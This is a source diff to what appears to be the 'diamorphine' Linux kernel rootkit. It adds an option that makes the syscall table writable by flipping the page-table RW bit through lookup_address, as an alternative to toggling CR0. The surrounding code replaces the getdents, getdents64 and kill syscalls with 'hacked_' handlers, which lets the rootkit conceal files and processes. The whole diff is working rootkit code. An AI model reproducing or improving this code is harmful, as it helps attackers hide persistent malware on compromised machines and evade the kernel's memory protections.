@@ -3,7 +3,9 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h> 
+#include <linux/version.h>
+
+#define KRW_PTE 0x01
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -355,30 +357,41 @@ write_cr0_forced(unsigned long val)
 #endif
 
 static inline void
-protect_memory(void)
+protect_memory(u_int64_t vaddr)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+# ifdef KRW_PTE
+	u_int32_t level;
+	pte_t *pte = lookup_address((u_int64_t)vaddr, &level);
+	pte->pte = pte->pte & ~_PAGE_RW;
+# else
+#  if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	write_cr0_forced(cr0);
-#else
+#  else
 	write_cr0(cr0);
-#endif
+#  endif
+# endif
 #elif IS_ENABLED(CONFIG_ARM64)
     update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			    section_size, PAGE_KERNEL_RO);
-
 #endif
 }
 
 static inline void
-unprotect_memory(void)
+unprotect_memory(u_int64_t vaddr)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+# ifdef KRW_PTE
+	u_int32_t level;
+	pte_t *pte = lookup_address((u_int64_t)vaddr, &level);
+	if (pte->pte & ~_PAGE_RW) pte->pte |= _PAGE_RW;
+# else
+#  if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	write_cr0_forced(cr0 & ~0x00010000);
-#else
+#  else
 	write_cr0(cr0 & ~0x00010000);
-#endif
+#  endif
+# endif
 #elif IS_ENABLED(CONFIG_ARM64)
     update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			    section_size, PAGE_KERNEL);
@@ -413,27 +426,40 @@ diamorphine_init(void)
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 #endif
 
-	unprotect_memory();
-
+#ifdef KRW_PTE
+	unprotect_memory(__sys_call_table);
+#else
+	unprotect_memory(NULL);
+#endif
 	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
-	protect_memory();
-
+#ifdef KRW_PTE
+        protect_memory(__sys_call_table);
+#else
+        protect_memory(NULL);
+#endif
 	return 0;
 }
 
 static void __exit
 diamorphine_cleanup(void)
 {
-	unprotect_memory();
-
+#ifdef KRW_PTE
+        unprotect_memory(__sys_call_table);
+#else
+        unprotect_memory(NULL);
+#endif
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 
-	protect_memory();
+#ifdef KRW_PTE
+        protect_memory(__sys_call_table);
+#else
+        protect_memory(NULL);
+#endif
 }
 
 module_init(diamorphine_init);
